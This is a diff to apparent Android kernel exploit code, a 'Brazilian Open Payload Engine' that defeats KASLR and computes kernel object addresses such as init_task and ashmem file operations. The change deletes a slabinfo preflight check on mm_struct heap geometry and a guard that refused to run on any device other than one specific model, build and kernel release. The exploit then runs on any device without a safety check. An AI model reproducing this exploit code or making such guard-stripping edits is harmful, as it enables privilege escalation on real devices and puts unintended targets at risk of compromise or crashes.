@@ -19,8 +19,6 @@
 #include <sys/resource.h>
 #include <sys/stat.h>
 #include <sys/syscall.h>
-#include <sys/system_properties.h>
-#include <sys/utsname.h>
 #include <sys/wait.h>
 #include <time.h>
 #include <unistd.h>
@@ -399,31 +397,6 @@ static int do_one_attempt(struct attempt_shared_state *shared,
     return 1;
   }
 
-  struct mm_slabinfo before;
-  if (read_mm_slabinfo(&before)) {
-    fprintf(stderr,
-            "[kaslr] mm_struct slabinfo active=%lu num=%lu objsize=%lu "
-            "objperslab=%lu active_slabs=%lu num_slabs=%lu\n",
-            before.active_objs, before.num_objs, before.objsize,
-            before.objperslab, before.active_slabs, before.num_slabs);
-  } else {
-    fprintf(stderr, "[kaslr] /proc/slabinfo mm_struct line not found\n");
-    return 0;
-  }
-  if (before.objsize != TARGET_MM_STRUCT_SIZE ||
-      before.objperslab != TARGET_MM_OBJECTS_PER_SLAB ||
-      before.pagesperslab != TARGET_MM_PAGES_PER_SLAB ||
-      before.active_objs > TARGET_MM_PREFLIGHT_MAX_OBJECTS ||
-      before.num_objs > TARGET_MM_PREFLIGHT_MAX_OBJECTS ||
-      before.num_slabs > TARGET_MM_PREFLIGHT_MAX_SLABS) {
-    fprintf(stderr,
-            "[preflight] mm_struct geometry/load rejected size=%lu per=%lu "
-            "pages=%lu active=%lu total=%lu slabs=%lu\n",
-            before.objsize, before.objperslab, before.pagesperslab,
-            before.active_objs, before.num_objs, before.num_slabs);
-    return 0;
-  }
-
   uint64_t init_task_addr = kernel_base + TARGET_INIT_TASK_OFF;
   uint64_t ashmem_misc_fops_addr =
       kernel_base + TARGET_ASHMEM_MISC_FOPS_OFF;
@@ -507,21 +480,6 @@ static void raise_rlimit_to_max(int resource) {
   }
 }
 
-static int property_equals(const char *name, const char *expected) {
-  char value[PROP_VALUE_MAX] = {0};
-  return __system_property_get(name, value) > 0 &&
-         strcmp(value, expected) == 0;
-}
-
-static int target_matches(void) {
-  struct utsname info;
-  return uname(&info) == 0 &&
-         strcmp(info.release, TARGET_KERNEL_RELEASE) == 0 &&
-         property_equals("ro.product.model", TARGET_MODEL) &&
-         property_equals("ro.product.device", TARGET_DEVICE) &&
-         property_equals("ro.build.version.incremental", TARGET_BUILD);
-}
-
 static int app_main(void) {
   struct timespec payload_started;
   if (clock_gettime(CLOCK_MONOTONIC, &payload_started) == -1) {
@@ -535,13 +493,6 @@ static int app_main(void) {
   }
 
   puts("[BOPE] Brazilian Open Payload Engine initialized");
-
-  if (!target_matches()) {
-    fprintf(stderr,
-            "[target] refused: expected %s/%s build=%s kernel=%s\n",
-            TARGET_MODEL, TARGET_DEVICE, TARGET_BUILD, TARGET_KERNEL_RELEASE);
-    return 1;
-  }
 
   int boot_quiet_sec = env_int_clamped("BOOT_QUIET_SEC", 120, 0, 300);
   struct timespec boot_now;
